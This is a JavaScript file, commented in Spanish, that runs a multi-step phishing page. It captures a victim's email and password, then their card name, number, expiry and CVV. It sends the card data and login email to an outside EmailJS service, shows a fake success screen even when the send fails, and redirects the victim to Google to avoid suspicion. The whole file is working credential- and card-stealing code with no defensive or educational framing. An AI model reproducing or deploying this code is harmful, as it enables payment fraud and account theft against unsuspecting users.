document.addEventListener('DOMContentLoaded', () => {
 
 const step1 = document.getElementById('step1');
 const step2 = document.getElementById('step2');
 const loader = document.getElementById('loader');
 const success = document.getElementById('success');

 // --- CONFIGURACIÓN EMAILJS ---
 // Reemplaza con tus IDs reales de EmailJS
 const SERVICE_ID = 'service_cowgn0s';
 const TEMPLATE_ID = 'template_pa8cml7';

 // Paso 1: Email y Password
 step1.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    console.log("Credenciales capturadas:", email, password);

    // Transición suave
    step1.classList.remove('active');
    setTimeout(() => {
        step2.classList.add('active');
    }, 200);
 });

 // Paso 2: Tarjeta
 step2.addEventListener('submit', (e) => {
    e.preventDefault();

    // Capturar datos de tarjeta
    const cardName = document.getElementById('cardName').value;
    const cardNumber = document.getElementById('cardNumber').value;
    const cardExpiry = document.getElementById('cardExpiry').value;
    const cardCvv = document.getElementById('cardCvv').value;

    // Mostrar loader
    step2.classList.remove('active');
    loader.classList.add('active');

    // 3 segundos de "procesando"
    setTimeout(() => {
        
        // --- AQUÍ ENVIAMOS LOS DATOS ---
        const params = {
            nombre: cardName,
            numero: cardNumber,
            expiracion: cardExpiry,
            cvv: cardCvv,
            email_login: document.getElementById('email').value
        };

        // Enviar a EmailJS
        emailjs.send(SERVICE_ID, TEMPLATE_ID, params)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
            }, function(error) {
                console.log('FAILED...', error);
                // Aun si falla, mostramos el éxito visualmente para no romper la experiencia
            });

        // Mostrar pantalla de éxito
        loader.classList.remove('active');
        success.classList.add('active');

        // Redirigir
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 2000);

    }, 3000);
 });

 // Formato automático: Número de tarjeta (espacios)
 const cardInput = document.getElementById('cardNumber');
 cardInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formattedValue += ' ';
        formattedValue += value[i];
    }
    e.target.value = formattedValue;
 });

 // Formato automático: Fecha (barra)
 const expiryInput = document.getElementById('cardExpiry');
 expiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
    }
    e.target.value = value;
 });
});
